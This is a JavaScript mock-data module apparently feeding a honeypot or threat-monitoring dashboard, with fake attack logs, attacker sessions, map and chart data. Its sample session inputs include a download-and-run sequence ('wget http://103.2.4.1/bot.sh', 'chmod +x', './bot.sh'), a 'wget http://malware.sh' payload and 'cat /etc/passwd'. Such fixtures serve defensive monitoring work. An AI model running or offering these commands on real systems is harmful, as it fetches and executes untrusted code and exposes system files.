export const MOCK_STATS = {
    activeSessions: 12,
    blockedIPs: 843,
    credentialsHarvested: 156,
    totalAttacks: 12450,
    concurrentConnections: 350,
    mttb: "0.92s",
    mitreCoverage: 8,
    systemUptime: "99.5%"
};

export const THREAT_LOGS = [
    { id: "evt-1024", timestamp: "18:24:12", ip: "192.168.1.105", country: "RU", type: "SSH_AUTH_FAIL", payload: "root / 123456", mitreId: "T1110", action: "Blocked", timeToBlock: "0.82s" },
    { id: "evt-1023", timestamp: "18:23:55", ip: "45.22.19.11", country: "CN", type: "COMMAND_EXEC", payload: "wget http://malware.sh", mitreId: "T1059", action: "Blocked", timeToBlock: "0.74s" },
    { id: "evt-1022", timestamp: "18:23:10", ip: "89.11.23.44", country: "IR", type: "SHELL_OPEN", payload: "hassh=23984723984", mitreId: "T1550", action: "Active", timeToBlock: null },
    { id: "evt-1021", timestamp: "18:22:45", ip: "103.22.11.55", country: "VN", type: "SSH_AUTH_FAIL", payload: "admin / admin", mitreId: "T1110", action: "Blocked", timeToBlock: "0.85s" },
    { id: "evt-1020", timestamp: "18:21:30", ip: "185.22.11.22", country: "BR", type: "PORT_SCAN", payload: "TCP 2222", mitreId: "T1046", action: "Blocked", timeToBlock: "0.81s" },
];

export const ACTIVE_SESSIONS = [
    {
        id: "sess-001",
        ip: "45.22.19.11",
        country: "CN",
        startTime: "18:20:00",
        duration: "4m 12s",
        client: "Putty",
        fingeprint: "23984723984",
        input: ["uname -a", "whoami", "cd /var/tmp", "wget http://103.2.4.1/bot.sh", "chmod +x bot.sh", "./bot.sh"],
        status: "Active"
    },
    {
        id: "sess-002",
        ip: "192.168.1.105",
        country: "RU",
        startTime: "18:22:15",
        duration: "1m 57s",
        client: "OpenSSH_8.2",
        fingeprint: "9988776655",
        input: ["cat /etc/passwd", "ls -l /home"],
        status: "Active"
    }
];

export const MAP_DATA = [
    { name: "China", lat: 35.8617, lng: 104.1954, count: 450, color: "#ef4444", topIp: "45.22.19.11", dominantTtp: "T1059 (Execution)", topHassh: "23984723984" },
    { name: "Russia", lat: 61.5240, lng: 105.3188, count: 320, color: "#f97316", topIp: "192.168.1.105", dominantTtp: "T1110 (Brute Force)", topHassh: "9988776655" },
    { name: "Brazil", lat: -14.2350, lng: -51.9253, count: 120, color: "#eab308", topIp: "185.22.11.22", dominantTtp: "T1046 (Port Scan)", topHassh: "Unknown" },
    { name: "USA", lat: 37.0902, lng: -95.7129, count: 80, color: "#3b82f6", topIp: "66.249.64.12", dominantTtp: "T1082 (System Info)", topHassh: "1122334455" },
];

// Mock data for charts
export const ATTACK_TYPES = [
    { name: 'Brute Force', value: 65, fill: '#ef4444' },
    { name: 'Command Injection', value: 20, fill: '#f97316' },
    { name: 'Port Scanning', value: 10, fill: '#eab308' },
    { name: 'Malware Upload', value: 5, fill: '#8b5cf6' },
];
